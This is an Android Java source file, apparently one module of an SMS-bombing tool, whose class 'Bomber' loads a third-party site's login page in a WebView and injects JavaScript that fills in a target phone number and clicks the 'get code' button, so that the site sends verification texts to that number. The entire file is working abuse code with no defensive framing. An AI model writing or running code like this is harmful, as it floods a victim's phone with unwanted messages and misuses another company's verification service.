package com.example.service;

import java.net.URL;

import android.content.Context;
import android.webkit.WebView;
import android.webkit.WebViewClient;

public class Bomber {
	public static void bomb(final String phoneNumber,WebView webView){

		String url = "http://www.souche.com/pages/minilogin.html";	
		webView.getSettings().setJavaScriptEnabled(true);
		webView.setWebViewClient(new WebViewClient(){
			public void onPageFinished(WebView webView,String url){	
				super.onPageFinished(webView, url);
				webView.loadUrl("javascript:"+"var ele = document.getElementById(\"mem-tel\");" +
						"ele.value = "+phoneNumber+";var ele = document.getElementById(\"get-code\");" +
						"ele.click();");		
			}			
		});	
		webView.loadUrl(url);
	}
	
}
